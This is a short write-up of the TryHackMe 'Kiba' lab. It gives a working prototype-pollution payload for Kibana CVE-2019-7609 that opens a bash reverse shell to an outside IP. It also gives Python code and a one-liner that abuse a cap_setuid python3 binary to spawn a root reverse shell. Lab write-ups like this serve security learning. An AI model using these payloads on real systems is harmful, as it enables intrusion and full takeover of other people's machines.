#prototype-pollution #javascript #capabilities

https://tryhackme.com/r/room/kiba

---
#### Nmap
![[Screenshot_2024-05-30_16-09-00.png]]

Kiba is on port `5601`

I'll use this [CVE](https://github.com/mpgn/CVE-2019-7609) to get a reverse shell through RCE:
```javascript
.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/10.14.79.56/9001 0>&1\'");//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
```

And here I m in

Now it's time to explain this new spell, I've learnt: **Capabilities**

Here is the thing, `linpeas` gave me:
```text
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
```
This mean the `setuid` capability has been given to this python3 binary with the flags `e`ffective and `p`ermitted.
So I can change my UID during a python script to elevate root with `os.setuid(0)` and then trigger a reverse shell:
```python
import socket
import subprocess
import os

os.setuid(0) #here I become root

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.14.79.56",9003))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("sh")
```

The short version from revshell with `os.setuid(0)` added:
```shell
/home/kiba/.hackmeplease/python3 -c 'import socket,subprocess,os;os.setuid(0);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.79.56",9003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

And here I am root
